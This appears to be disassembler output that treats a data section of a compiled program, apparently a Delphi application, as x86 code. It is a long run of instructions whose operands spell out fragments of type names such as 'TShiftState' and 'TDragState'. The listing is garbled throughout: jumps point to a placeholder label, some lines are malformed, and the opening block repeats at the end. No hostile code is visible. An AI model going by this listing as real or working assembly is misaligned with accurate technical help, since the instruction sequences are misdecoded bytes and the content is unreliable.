insd
dec ebp
popad
outsb
jne r-xdata
inc edx
add ah ch
sub al 0x44
add [ ebp + ebp + 0x2e4c0044 ] bh
inc esp
add [ esi * 4 + 0x2de00042 ] dl
inc esp
add [ esi + esi * 4 ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
outsb
nop
nop
test [ eax + 0x42 ] bh
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
inc edx
add al ah
sub eax 0xb6040044
dec esp
sub eax 0xb2900044
inc edx
add [ ebp + ebp - 0x4aebffbc ] dl
jae r-xdata
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
add [ eax + 0x6004278 ] al
outsd
insd
popad
je r-xdata
je r-xdata
jbe r-xdata
insb
mov dl 0x42
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
jb r-xdata
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
arpl [ eax + 0x78309090 ] dx
inc edx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ecx ] al
add [ eax ] al
add [ eax + edi * 2 ] ch
inc edx
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
push es
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
nop
nop
pop esp
js r-xdata
retn 0x44
add [ eax + 0x40040d4 ] bl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
dec ebp
popad
popad
imul ebp [ esi + 0x74 ] 0x90909073
insb
jns r-xdata
add [ esi + ecx * 8 ] ch
inc ebx
add [ ecx * 8 - 0x4f87ffbd ] cl
inc edx
add [ ecx ] al
add ch bh
[ edx + esi * 4 + 0x42 ]
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
inc esp
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax - 0x30 ] 0xcc
inc ebx
add al cl
outsd
insd
sar [ eax + 0x42 ] 0x0
push es
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ esi ] al
add [ ecx ] al
inc esp
add [ ebx + esi * 4 + 0x49400042 ] dh
inc eax
add [ eax ] bh
mov ah 0x42
add [ eax - 0x7bffbfb7 ] cl
mov ah 0x42
add al dl
dec ecx
inc eax
add ah dh
dec ecx
inc eax
add al dl
mov ah 0x42
add [ eax - 0x4b ] dl
inc edx
add [ edx + ecx * 2 + 0x40 ] cl
add [ ebp + esi * 4 + 0x42 ] bh
add [ edx + ecx * 2 + 0x40 ] ch
add [ eax - 0x73ffbd4b ] ch
dec edx
inc eax
add [ edx + ecx * 2 - 0x4a27ffc0 ] bl
inc edx
add [ edx + esi * 4 + 0x54120042 ] dh
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
cmp [ ecx + 0x10042 ] dh
add [ eax ] al
add al [ eax ]
or [ ebp + 0x61 ] ecx
js r-xdata
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
mov al 0x42
add [ eax - 0x6fffbd88 ] eax
aam 0x78
inc edx
add [ ecx ] al
andps xmm0 [ ebx + 0x6f ]
add [ eax + 0x77809090 ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
ja r-xdata
outsb
jb r-xdata
inc ebp
jbe r-xdata
je r-xdata
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax + eax ] dl
add bh bh
cmp [ ecx + 0x10042 ] dh
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ edi + 0x68 ] 0x4278d074
js r-xdata
imul esp [ gs : edi + 0x68 ] 0x4278d074
add [ eax + eax ] cl
add bh bh
cmp [ ecx + 0x10042 ] dh
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
sub eax 0x2e4c0044
add [ eax + eax ] bl
add [ eax ] al
fadd [ eax + 0x40 ]
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ 0x66696853 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
inc ebp
jbe r-xdata
outsb
je r-xdata
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
sar [ eax + 0x42 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x4278d074
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
push esp
push ebx
push 0x53746669
jns r-xdata
je r-xdata
outsd
jb r-xdata
outsb
je r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ ecx + 0x7 ] ebx
je r-xdata
je r-xdata
js r-xdata
imul ebp [ esi + 0x74 ] 0x42793c73
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
push es
push ebx
outsb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc ebp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ 0x66696853 ] al
je r-xdata
add al 0x8
push es
push ebx
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x65
jb r-xdata
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push ebx
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax ] dl
add [ eax ] al
inc edx
outsd
insb
jae r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
arpl [ ecx + eax + 0x3 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
pop es
add [ ecx + 0x7 ] ebx
jae r-xdata
je r-xdata
outsb
je r-xdata
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
arpl [ ebp + 0x7 ] sp
nop
nop
sbb al 0x7b
inc edx
add [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec esp
jpo r-xdata
inc ebx
push 0x7b4c7261
je r-xdata
jpe r-xdata
or [ ecx ] cl
push esp
dec ebx
jns r-xdata
jb r-xdata
je r-xdata
inc edx
jne r-xdata
jpe r-xdata
nop
nop
nop
sub [ edx + 0x42 ] bh
add [ eax ] cl
add [ eax ] al
add al dl
js r-xdata
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
arpl [ ebp + 0x7 ] sp
pop eax
pop es
dec ecx
outsb
je r-xdata
arpl [ gs : eax + eax + 0x1 ] si
jb r-xdata
jb r-xdata
jb r-xdata
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push ebx
outsb
jb r-xdata
je r-xdata
dec ecx
outsb
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
popad
outsb
nop
nop
mov esp 0x800427b
dec edi
jbe r-xdata
push cs
push esp
dec ebx
jns r-xdata
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
jbe r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
outsb
je r-xdata
add [ ecx ] al
pop ecx
pop es
je r-xdata
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
jne r-xdata
add al 0x8
push es
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add eax 0x74617453
jl r-xdata
je r-xdata
or [ esi ] al
push esp
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
arpl [ gs : eax + eax + 0x1 ] si
pop es
inc esp
jb r-xdata
push cs
push esp
add [ eax ] cl
jb r-xdata
inc edx
outsb
je r-xdata
add [ ebx ] al
or [ esi ] al
jb r-xdata
outsb
add [ 0x66696853 ] al
je r-xdata
push 0xb746669
dec ebp
outsd
jbe r-xdata
arpl [ gs : eax + ecx + 0x6 ] si
jb r-xdata
or eax 0x646e4554
inc esp
jb r-xdata
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
push ebx
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jb r-xdata
je r-xdata
jl r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x28909090
jpe r-xdata
nop
nop
push esp
push ebx
push 0x53746669
jns r-xdata
popad
push 0x65
inc ebp
jbe r-xdata
add [ ecx ] al
pop ecx
pop es
inc esp
jb r-xdata
jb r-xdata
jb r-xdata
pop es
inc edx
outsd
outsd
insb
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx ] al
pop eax
push esp
dec edi
jb r-xdata
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x48 ] si
jl r-xdata
jbe r-xdata
push ebx
je r-xdata
inc esp
jb r-xdata
outsb
je r-xdata
push edi
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
jne r-xdata
outsb
jb r-xdata
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
inc ebp
jbe r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
je r-xdata
jb r-xdata
inc edx
jb r-xdata
outsd
jne r-xdata
jo r-xdata
jl r-xdata
jbe r-xdata
outsb
je r-xdata
add [ eax ] cl
popad
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
je r-xdata
jb r-xdata
pop eax
pop es
dec ecx
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
jbe r-xdata
jb r-xdata
xchg esp eax
pop es
dec ecx
outsb
je r-xdata
outsb
je r-xdata
add eax 0x6f6c6c41
je r-xdata
je r-xdata
popad
outsb
nop
jb r-xdata
dec ecx
add [ ecx + 0x7 ] ebx
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
jb r-xdata
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
arpl [ gs : eax + ecx + 0x6 ] si
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
ja r-xdata
add [ 0x6f6c6c41 ] eax
push esp
outsd
insb
or [ ecx ] cl
dec esi
ja r-xdata
jb r-xdata
je r-xdata
nop
pushad
jge r-xdata
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
nop
mov esp 0x800427d
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
inc edx
outsd
outsd
insb
popad
outsb
pop es
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
dec ecx
outsb
je r-xdata
add [ eax + 0x7 ] ebx
inc ebx
outsd
outsb
add [ eax ] cl
or al 0x54
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
pop es
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
push esp
andps xmm0 [ edx + esi * 2 + 0x61 ]
popad
jb r-xdata
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
outsd
insb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
outsb
outsd
insb
push ebx
outsb
jb r-xdata
outsb
je r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push ebx
outsd
or [ esi ] al
arpl [ eax + ecx + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
add [ eax ] cl
je r-xdata
popad
push ebx
or dl [ esp + eax * 2 + 0x72 ]
push ebx
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
outsb
je r-xdata
arpl [ ebp + 0x52 ] sp
outsb
je r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
jb r-xdata
inc edx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
aam 0x7e
inc edx
add [ eax ] cl
pop ss
push esp
inc ebx
outsd
outsb
push eax
outsd
jae r-xdata
jb r-xdata
jb r-xdata
adc [ 0x6c666e49 ] ecx
jne r-xdata
outsd
outsb
je r-xdata
push esp
inc ebx
add cl [ eax ]
push es
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
push edx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
jpe r-xdata
jb r-xdata
add eax 0x65530608
outsb
or [ eax ] dl
push esp
dec ebp
outsd
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
nop
nop
nop
js r-xdata
add [ edi ] eax
inc ebx
popad
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
dec ebp
outsd
jne r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 ] si
jle r-xdata
je r-xdata
jb r-xdata
add eax 0x65530608
outsb
jbe r-xdata
inc ebp
jbe r-xdata
jae r-xdata
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
add [ eax ] ecx
je r-xdata
dec ecx
outsb
add [ gs : edx ] cl
jb r-xdata
arpl [ ecx + eax + 0x8 ] si
push 0x65
imul esp [ gs : edi + 0x68 ] 0x6e490774
je r-xdata
add eax 0x66696853
outsb
je r-xdata
je r-xdata
push edi
push ss
push esp
dec ebp
outsd
jne r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
je r-xdata
pop es
dec ecx
outsb
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
jb r-xdata
jb r-xdata
push edi
push 0x446c6565
insb
add [ edx ] cl
push esp
push ebx
push 0x53746669
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x7f ] dl
inc edx
add ah ch
add [ edx ] 0x20
outsd
jo r-xdata
insb
outsd
ja r-xdata
or [ esi ] al
push 0x556c6565
jo r-xdata
push edi
add eax 0x65530608
outsb
jb r-xdata
dec eax
popad
pop es
jae r-xdata
nop
nop
push eax
jg r-xdata
outsb
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jb r-xdata
push edx
jae r-xdata
push es
pop es
je r-xdata
add [ eax ] ecx
dec esi
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
add ah ah
jo r-xdata
add [ eax ] eax
add ah dh
mov ah 0x43
add [ esp + ebp ] bh
inc esp
js r-xdata
jb r-xdata
inc ebp
jbe r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
je r-xdata
add [ 0x66696853 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
je r-xdata
jne r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
push ebx
outsb
jb r-xdata
push es
outsb
je r-xdata
popad
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ eax ] al
inc eax
push eax
outsd
jae r-xdata
pop es
je r-xdata
add [ edi ] eax
or [ ebp + 0x6f ] cl
jne r-xdata
dec ecx
outsb
je r-xdata
jpe r-xdata
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
fadd [ edx ]
aam 0xdd
inc edx
add [ ebx + eax * 8 ] al
inc edx
add [ edx + eax * 8 ] ah
inc edx
add [ eax ] ah
iretd
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax + 0x50 ] 0xb7
inc edx
add [ ecx + esi * 8 - 0x1ccfffbe ] dh
inc edx
add [ ecx * 8 - 0xe8bffbd ] cl
inc edx
add [ edx ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
add [ edx ] r-xdata
and [ ecx ] al
add [ eax ] al
hlt
jbe r-xdata
loope r-xdata
inc esp
add [ eax - 0x1bffbb3e ] ch
push eax
add ah cl
mov ebx 0xbb200042
inc edx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x49cbffbc ] bl
inc edx
add al bl
fadd [ edx ]
mov esp 0xd40042dc
fld [ edx ]
add al 0xc3
add [ ecx + esi * 8 + 0x42 ] dh
push eax
outsd
jae r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
nop
sub [ eax + 0x12080042 ] al
push esp
inc ebx
outsd
outsb
je r-xdata
add [ edi ] eax
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
pop es
inc edx
outsd
outsd
insb
popad
outsb
mov esp 0x4280
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7f ] al
inc edx
add [ eax + 0x72 ] bh
inc edx
dec eax
popad
push eax
outsd
jae r-xdata
jb r-xdata
jb r-xdata
push 0x746e4907
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
outsb
je r-xdata
dec eax
popad
add [ edi ] eax
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add [ 0x66696853 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
nop
nop
nop
les edi [ edi + 0x42 ]
add [ eax ] cl
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add ecx [ eax ]
sub_4274ac
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax ] cl
xchg ebp eax
inc edx
add [ eax + 0x78004296 ] dl
xchg esi eax
inc edx
add [ esp + edx * 4 + 0x42 ] ch
add [ eax ] ah
xchg ebp eax
inc edx
add al al
xchg esi eax
inc edx
add ah cl
xchg esi eax
inc edx
add ah ah
xchg esi eax
inc edx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc edx
add [ eax ] ah
xchg ebp eax
inc edx
add al al
xchg esi eax
inc edx
add ah cl
xchg esi eax
inc edx
add ah ah
xchg esi eax
inc edx
add [ eax - 0x69 ] dh
inc edx
add al dh
xchg esi eax
inc edx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi + 0x75 ] si
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] ah
inc edx
add [ eax + eax ] bh
add [ eax ] al
je r-xdata
add [ eax + ebx * 4 ] bl
inc edx
add [ edi + edx * 4 ] dh
inc edx
add [ eax ] ah
xchg ebp eax
inc edx
add [ eax + ebx * 4 ] bh
inc edx
add ah cl
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
inc edx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax - 0x6fffbd69 ] ah
xchg esi eax
inc edx
add [ eax - 0x6a ] bh
inc edx
add [ edi + edx * 4 ] dh
inc edx
add [ eax - 0x6a ] bh
inc edx
add [ ecx + ebx * 4 + 0x42 ] al
add [ eax ] ah
xchg ebp eax
inc edx
add al al
xchg esi eax
inc edx
add ah cl
xchg esi eax
inc edx
add ah ah
inc ebx
outsd
outsb
je r-xdata
inc edx
inc ebx
outsd
outsb
je r-xdata
xchg esi eax
inc edx
add [ eax - 0x68 ] ch
add [ eax ] al
add [ eax ] al
in al dx
je r-xdata
inc ebx
add [ esi + edi * 8 ] ah
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x76 ] si
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 ] cl
xchg esi eax
inc edx
add al dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4c ] si
jbe r-xdata
inc edx
add [ eax - 0x69 ] dh
cwde
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x3c ] si
jne r-xdata
inc edx
add al dh
xchg esi eax
inc edx
add [ edx ] dl
push esp
inc esp
jb r-xdata
xchg edi eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
retn 0x44
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ebx
outsd
outsb
push esp
inc eax
add [ eax ] al
inc [ eax ]
and [ edi + 0x540e0042 ] ch
add [ eax + eax ] ah
add [ esp + edx * 8 ] ch
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x1c ] 0xae
inc edx
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ ecx * 8 - 0x1dbffbd ] cl
rol [ eax + eax + 0x8 ] 0x99
inc edx
add [ eax + 0x2c004297 ] ah
fwait
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x700042 ] al
add [ eax ] al
in al dx
je r-xdata
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax - 0x1bffbd69 ] ah
xchg edi eax
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x4c ] 0x2d
inc esp
add [ eax - 0x6bffbd4e ] dl
sub eax 0xb5140044
jae r-xdata
cdq
inc edx
add [ eax + ebx * 4 - 0x65c7ffbe ] dl
inc edx
add ah ch
0x9b0c0042 0x42
dec esp
fwait
inc edx
add [ edi ] cl
push esp
inc esp
jb r-xdata
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
or [ esp + edx * 2 + 0x61 ] edx
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4277fc90
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
ja r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x77
or al 0x77
inc edx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
bound ecx [ edi + 0x72 ]
jb r-xdata
imul edx [ eax + 0x42785c90 ] 0x0
add [ ecx ] ecx
push esp
push esp
popad
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc edx
add ah ch
sub al 0x44
add [ ebp + ebp + 0x2e4c0044 ] bh
inc esp
add [ esi * 4 + 0x2de00042 ] dl
inc esp
add [ esi + esi * 4 ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
outsb
nop
nop
test [ eax + 0x42 ] bh
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
inc edx
add al ah
sub eax 0xb6040044
dec esp
sub eax 0xb2900044
inc edx
add [ ebp + ebp - 0x4aebffbc ] dl
jae r-xdata
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
add [ eax + 0x6004278 ] al
outsd
insd
popad
je r-xdata
je r-xdata
jbe r-xdata
insb
mov dl 0x42
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
jb r-xdata
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
arpl [ eax + 0x78309090 ] dx
inc edx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ecx ] al
add [ eax ] al
add [ eax + edi * 2 ] ch
inc edx
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
push es
